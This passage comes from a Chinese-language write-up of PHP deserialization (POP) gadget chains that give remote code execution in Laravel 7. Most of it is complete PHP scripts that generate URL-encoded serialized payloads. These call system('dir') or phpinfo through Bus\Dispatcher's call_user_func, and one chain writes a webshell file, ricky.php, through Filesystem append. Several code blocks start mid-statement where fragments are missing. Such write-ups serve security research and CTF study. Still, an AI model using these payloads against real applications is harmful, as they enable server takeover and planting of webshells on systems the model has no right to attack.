    }
    namespace {
        use Illuminate\Notifications\ChannelManager;
        use Illuminate\Routing\PendingResourceRegistration;
        $b = new ChannelManager('phpinfo', '-1');
        $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
        echo urlencode(serialize($a));
    }
上传 shell 的 POP链
    registrar = $registrar;
                $this->name = $name;
                $this->controller = $controller;
                $this->options = $options;
            }
        }
    }
    namespace Illuminate\Notifications
    {
        class ChannelManager
        {
            protected $container;
            protected $defaultChannel;
            protected $customCreators;
            function __construct($function, $parameter)
            {
                $this->container = $parameter;
                $this->customCreators = ['x' => $function];
                $this->defaultChannel = 'x';
            }
        }
    }
    namespace Illuminate\Filesystem {
        class Filesystem{
            public $path = 'ricky.php';
            public $data = '';
        }
    }
    namespace Illuminate\Auth {
        class RequestGuard {
            protected $user;
            protected $callback;
            protected $request = 'ricky.php';
            protected $provider = '';
            public function __construct($callback) {
                $this->callback = $callback;
            }
        }
    }
    namespace {
        use Illuminate\Auth\RequestGuard;
        use Illuminate\Filesystem\Filesystem;
        use Illuminate\Notifications\ChannelManager;
        use Illuminate\Routing\PendingResourceRegistration;
        $c = new RequestGuard([new Filesystem(), 'append']);
        $b = new ChannelManager('call_user_func', [$c, 'user']);
        $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
        echo urlencode(serialize($a));
    }
## POP链3
入口类: `Illuminate\Broadcasting\pendiongBroadcast`
最后RCE调用类：`Illuminate\Bus\Dispatcher`
一开始使用 `__destruct()` 函数直接跟进到 dispatch 方法
        public function dispatch($command)
        {
            if ($this->queueResolver && $this->commandShouldBeQueued($command)) {
                return $this->dispatchToQueue($command);
            }
            return $this->dispatchNow($command);
        }
跟进一下`dispatchToQueue()`方法
        public function dispatchToQueue($command)
        {
            $connection = $command->connection ?? null;
            $queue = call_user_func($this->queueResolver, $connection);
            if (! $queue instanceof Queue) {
                throw new RuntimeException('Queue resolver did not return a Queue implementation.');
            }
            if (method_exists($command, 'queue')) {
                return $command->queue($queue, $command);
            }
            return $this->pushCommandToQueue($queue, $command);
        }
发现 call_user_func , 想办法利用, `$this->queueResolver` 和 `$connection` 都可控, 返回
dispatch 跟进一下 commandShouldBeQueued
        protected function commandShouldBeQueued($command)
        {
            return $command instanceof ShouldQueue;
        }
需要`$command`是一个实现了ShouldQueue接口的对象，全局搜索一下，还挺多的，随便找一个用就可以了，这里用的是`QueuedCommand`类。这样就if判断成功，进入`dispatchToQueue()`
, 然后就可以利用了, POP链就形成了
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Foundation\Console {
        class QueuedCommand {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver) {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace {
        $c = new Illuminate\Bus\Dispatcher('system');
        $b = new Illuminate\Foundation\Console\QueuedCommand('dir');
        $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
        echo urlencode(serialize($a));
    }
反序列化成功
然后利用其它的也可以 (把 laravel 7 所有的继承 ShouldQueue 接口的都列出来了)
exp 1
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Broadcasting {
        class BroadcastEvent {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver) {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace {
        $c = new Illuminate\Bus\Dispatcher('system');
        $b = new Illuminate\Broadcasting\BroadcastEvent('dir');
        $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
        echo urlencode(serialize($a));
    }
exp 2
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Notifications {
        class SendQueuedNotifications {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver) {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace {
        $c = new Illuminate\Bus\Dispatcher('system');
        $b = new Illuminate\Notifications\SendQueuedNotifications('dir');
        $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
        echo urlencode(serialize($a));
    }
exp 3
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Queue {
        class CallQueuedClosure {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver) {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace {
        $c = new Illuminate\Bus\Dispatcher('system');
        $b = new Illuminate\Queue\CallQueuedClosure('dir');
        $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
        echo urlencode(serialize($a));
    }
exp 4
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Events {
        class CallQueuedListener {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver) {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace {
        $c = new Illuminate\Bus\Dispatcher('system');
        $b = new Illuminate\Events\CallQueuedListener('dir');
        $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
        echo urlencode(serialize($a));
    }
## 总结
相比 laravel 5.8, 可以利用的反序列化链变少了, 但是核心思路没有变, 还是通过 `__destruct()` 触发 `__call` 或者
`__invoke` 函数, 再通过 `call_user_func` 或 `call_user_func_array` 进行函数回调达成 RCE